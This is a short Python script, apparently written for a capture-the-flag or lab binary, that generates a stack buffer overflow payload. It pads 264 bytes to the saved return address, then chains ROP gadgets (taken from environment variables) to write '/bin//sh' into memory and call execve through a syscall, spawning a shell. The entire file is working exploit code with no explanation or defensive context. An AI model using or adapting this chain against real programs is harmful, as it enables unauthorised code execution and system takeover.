#!/usr/bin/env python3
from struct import pack
from os import write, getenv
import sys

def need(name):
    v = getenv(name)
    if not v:
        sys.stderr.write(f"[!] Missing env var {name}\n"); sys.exit(2)
    try:
        return pack("<Q", int(v, 16))
    except Exception as e:
        sys.stderr.write(f"[!] Bad hex in {name}={v}: {e}\n"); sys.exit(2)

pop_rax        = pack("<Q", 0x451f87)          # pop rax ; ret (from your set)
pop_rdi        = need("POP_RDI")
pop_rsi        = need("POP_RSI")
pop_rdx        = need("POP_RDX")
movq_rax_to_m  = need("MOVQ_RAX_TO_MEM")       # mov qword ptr [rax], rdx ; ret
syscall_g      = need("SYSCALL")
at_data        = need("AT_DATA")
OFFSET         = int(getenv("OFFSET","264"))

null   = pack("<Q", 0)
execve = pack("<Q", 59)

# padding to saved RIP
buff = b"A"*OFFSET

# --- write "/bin//sh\0" at .data ---
buff += pop_rax; buff += at_data
buff += pop_rdx; buff += b"/bin//sh"
buff += movq_rax_to_m
buff += pop_rax; buff += pack("<Q", int.from_bytes(at_data,"little")+8)
buff += pop_rdx; buff += null
buff += movq_rax_to_m

# --- set up execve("/bin//sh",0,0) ---
buff += pop_rdi; buff += at_data
buff += pop_rsi; buff += null
buff += pop_rdx; buff += null
buff += pop_rax; buff += execve
buff += syscall_g

write(1, buff)
